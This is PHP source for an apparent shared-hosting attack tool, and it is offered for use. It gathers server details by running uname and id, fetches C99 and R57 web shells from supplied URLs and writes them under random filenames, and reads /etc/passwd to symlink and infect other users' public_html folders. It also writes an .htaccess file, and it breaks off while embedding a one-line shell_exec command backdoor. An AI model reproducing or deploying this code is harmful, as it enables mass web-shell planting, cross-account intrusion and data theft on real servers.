<?php
# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
FUNCTION CopySheller($DIR) {
$Sheller = RndName();
$SH_TXT = (@$_POST['shellerURL']);
$file23 = (@file_get_contents("$SH_TXT"));
if (!$file23) {
echo "<font color=red>[+] Can't Open The Sheller File .</font><br>";
}
else {
$fp23 = @fopen("$DIR/$Sheller.php",'w+');
$fw23 = @fwrite($fp23,$file23);
if ($fw23) {
echo "<font color=green>[+] Uploaded Successful : $DIR/$Sheller.php</font><BR>";
}
@fclose($fp23);
 }
}
function is_windows() { return strtolower(substr(PHP_OS,0,3)) == "win"; }
$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE'];
$safe_mode=ini_get('safe_mode');
$mysql_stat=function_exists('mysql_connect');
$curl_on=function_exists('curl_version');
$dis_func=ini_get('disable_functions');
function sysinfo()
{
 global $curl_on, $dis_func, $mysql_stat, $safe_mode, $server, $HTTP_SERVER_VARS;
 echo (($safe_mode)?("Safe Mode: </b><font color=green>ON</font><b> "):
         ("<B>Safe Mode: </b><font color=red>OFF</font><b> "));
 $row_dis_func=explode(', ',$dis_func);
 echo ("PHP: </b><font color=blue>".phpversion()."</font><b> ");
 echo ("MySQL: </b>");
 if($mysql_stat){
  echo "<font color=green>ON </font><b>";
 }
 else {
  echo "<font color=red>OFF </font><b>";
 }
 echo "cURL: </b>";
 if($curl_on){
  echo "<font color=green>ON</font><b><br>";
 }else
  echo "<font color=red>OFF</font><b><br>";
 if ($dis_func!=""){
  echo "Disabled Functions : </b><font color=red>".$dis_func."</font><br><b>";
 }
 else {
  echo "Disabled Functions : </b><font color=green>None</font><br><b>";
 }
 $uname = @exec('uname -a');
 echo "OS: </b><font color=blue>";
 if (empty($uname)){
  echo (php_uname()."</font><br><b>");
 }else
  echo $uname."</font><br><b>";
 $id = @exec('id');
 echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
 echo "ID: </b><font color=blue>";
 if (!empty($id)){
  echo $id."</font><br><b>";
 }else
  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
       "</font><br><b>";
 echo "<b>RemoteAddress: </b><font color=red>".$HTTP_SERVER_VARS['REMOTE_ADDR']."</font> , <b>Server: </b><font color=red>".@gethostbyname($_SERVER["HTTP_HOST"])."</font>";
 if(isset($HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'])){
  echo "<b>RemoteAddressIfProxy: </b><font color=red>".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR']."</font>";
 }
 echo "</font></font>";
}
function RndName() {
$codelenght = 10;
while(@$newcode_length < $codelenght) {
$x=1;
$y=3;
$part = rand($x,$y);
if($part==1){$a=48;$b=57;}
if($part==2){$a=65;$b=90;}
if($part==3){$a=97;$b=122;}
$code_part=chr(rand($a,$b));
(@$newcode_length = $newcode_length + 1);
(@$newcode = $newcode.$code_part);
}
return $newcode;
}
# PHP Variables :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: PHP Variables #
echo "<CENTER>
  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse; border-style: solid; border-color: #C0C0C0; padding-left: 4; padding-right: 4; padding-top: 1; padding-bottom: 1' bordercolor='#111111' width='86%' bgcolor='#E0E0E0'>
    <tr>
      <td bgcolor='#AA0000' class='td'><div align='center' class='style4'>: Server Information : </div></td>
    </tr>
    <tr>
      <td style='padding:5px 5px 5px 5px '>";
	  echo sysinfo();
echo "	  </td>
    </tr>
    <tr>
      <td bgcolor='#AA0000' class='td' style='padding:0px 0px 0px 5px'><div align='center' class='style4'>
        <div align='left'>
          <form name='form4' method='post' action=''>
             View Directory : 
             <input name='GoDir' type='text' class='DIR' id='GoDir' size='120'>
          </form>
        </div>
      </div></td>
    </tr>
    <tr>
    <td width='100%' style='padding:5px 5px 5px 5px '>";
if (isset($_POST['Submit1']))
{
function C99_Create() {
$C99 = RndName();
$c99_add = (@$_POST['c99_txt']);
$C99_File = (@file_get_contents("$c99_add"));
if (!$C99_File){
echo "<font color=red>[+] Can't Open The C99 Sheller File .</font><br>";
}
else {
$fp1 = @fopen("$C99.php",'w+');
$fw1 = @fwrite($fp1,$C99_File);
if ($fw1) {
echo "<font color=green>[+] C99 Sheller Upload Successful : $C99.php</font><BR>";
}
else {
echo "<font color=red>[+] No Perm !</font><BR>";
}
@fclose($fp1);
}
}
function R57_Create() {
$R57 = RndName();
$r57_add = (@$_POST['r57_txt']);
$R57_File = (@file_get_contents("$r57_add"));
if (!$R57_File){
echo "<font color=red>[+] Can't Open The R57 Sheller File .</font><br>";
}
else {
$fp1 = @fopen("$R57.php",'w+');
$fw1 = @fwrite($fp1,$R57_File);
if ($fw1) {
echo "<font color=blue>[+] R57 Sheller Upload Successful : $R57.php</font><BR>";
}
else {
echo "<font color=red>[+] No Perm !</font><BR>";
}
@fclose($fp1);
}
}
for ($i=0;$i<=5;$i++) {
C99_Create();
R57_Create();
}
}

if (isset($_POST['Submit2']))
{
@mkdir("h4ckcity");
@chdir("h4ckcity");
echo '<font color=green>[+] Directory [ h4ckcity ] Created .</font><Br>';
echo '<font color=green>[+] Directory Changed .</font><Br>';
$file3 = 'Options +FollowSymLinks
DirectoryIndex seees.html
RemoveHandler .php
AddType application/octet-stream .php';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
if ($fw3) {
echo '<font color=green>[+] .htaccess File Uploaded .</font><BR>';
}
else {
echo "<font color=red>[+] No Perm To Create .htaccess File !</font><BR>";
}
@fclose($fp3);
$lines3=@file('/etc/passwd');
if (!$lines3) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines3 = $aresult;
@pclose($authp);
}
if (!$lines3) {
echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
echo "<font color=red>[+] Can't Make The Users Shortcuts .</font><BR>";
echo '<font color=red>[+] Finish !</font><BR>';
}
else {
foreach($lines3 as $line_num3=>$line3){
$sprt3=explode(":",$line3);
$user3=$sprt3[0];
@exec('ln -s /home/'.$user3.'/public_html ' . $user3);
}
echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
echo '<font color=green>[+] Finish !</font><BR>';
}
}
#######################################################################
Function START_Process() {
$lines=@file('/etc/passwd');
if (!$lines) {
$authp = @popen("/bin/cat /etc/passwd", "r");
$i = 0;
while (!feof($authp))
$aresult[$i++] = fgets($authp, 4096);
$lines = $aresult;
@pclose($authp);
}
if (!$lines) {
$EtcUrl = @$_REQUEST['ManuelDIR'];
$lines=@file("$EtcUrl");
}
if (!$lines) {
echo "<font color=red>[+] Can't Open /etc/passwd File . </font><Br>";
}
else {
$FileOpen = @fopen("DIR.txt","a");
if ($FileOpen) {
foreach($lines as $line_num=>$line){
$sprt=explode(":",$line);
$user=$sprt[0];
@fwrite($FileOpen,("home/$user/public_html\n"));
}
@fclose($FileOpen);
   $fp6 = @fopen("DIR.txt", 'r');
   if (!$fp6)
   {
     echo "<font color=red>[+] DIR.TXT Doesn't Exist, Please Try Again Later .</font><BR>";
   }
   else {
      while (!feof($fp6))
   {
      $order = fgetss($fp6,500);
   }
   rewind($fp6);
  while (!feof($fp6))
   {
      $order = fgetcsv($fp6, 500);
	  if(is_array($order))
	{
		foreach($order as $content) {
	  $dirr = '';
	  for ($i=0;$i<=11;$i++)
	  {
	  $test = @opendir("$dirr$content");
	  if (!$test){
	  $dirr = $dirr . '../';
	  }
	  }
	  if (!$test){
	  echo "<font color=red>[+] Directory Doesn't Exist .</font><BR>";
	  }
	  else {
	  @CopySheller("$dirr$content");
	  @CopySheller("$dirr$content/images");
	  @CopySheller("$dirr$content/include");
	  @CopySheller("$dirr$content/tmp");	
	  @CopySheller("$dirr$content/template");	  
	  }
	  }
	}
	}
   @fclose($fp6);
   }
}
else {
echo "<font color=red>[+] No Perm To Create DIR.TXT File, Don't Try Again There Is No Perm .</font><BR>";
}
}
}
#######################################################################
if (isset($_POST['Submit3']))
{
$SH_TXT_Check = (@$_POST['shellerURL']);
if ($SH_TXT_Check == '')
{
echo '<font color=red>[+] Plz Enter The Sheller URL .</font>';
}
else
{
@unlink('DIR.txt');
START_Process();
}
}
#######################################################################
if (isset($_POST['Submit4']))
{
$IName = (@$_POST['IndexName']);
if ($IName == '') {
echo '<font color=red>[+] Plz Insert Index Name, For Previous Directory Use ( ../ ) Symbol .</font><Br>';
}
else {
$CMD = '<?php $cmdd=(@$_REQUEST["cmd"]); echo(shell_exec($cmdd)); ?>